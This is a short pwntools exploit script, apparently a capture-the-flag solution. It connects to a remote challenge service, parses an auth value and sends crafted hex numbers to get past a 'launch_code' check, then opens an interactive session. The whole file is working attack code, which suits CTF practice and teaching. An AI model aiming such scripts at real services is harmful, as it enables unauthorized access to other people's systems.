from pwn import *


def con(i):
    return bytes(str(hex(i)[2:]), "latin-1")

a = int('110' + '0'*(32-3), 2)

while True:
    p = remote("0.cloud.chals.io", 12499)
    m = p.recvuntil(b">>> ")
    auth = int(m.split()[-6], 10)

    # p = process("./launch_code")
    # auth = int(p.recv().strip().split(b" ")[-1], 10)

    print(auth)
    di = a - auth
    if(di/4 != int(di/4)):
        p.close()
        continue
    a1, a2, a3, a4 = di//2, di//2, di//4, di//4 + 1
    payload = con(a1) + b" " + con(a2) + b" " + con(a3) + b" " + con(a4)
    print(payload)
    p.sendline(payload)

    p.interactive()
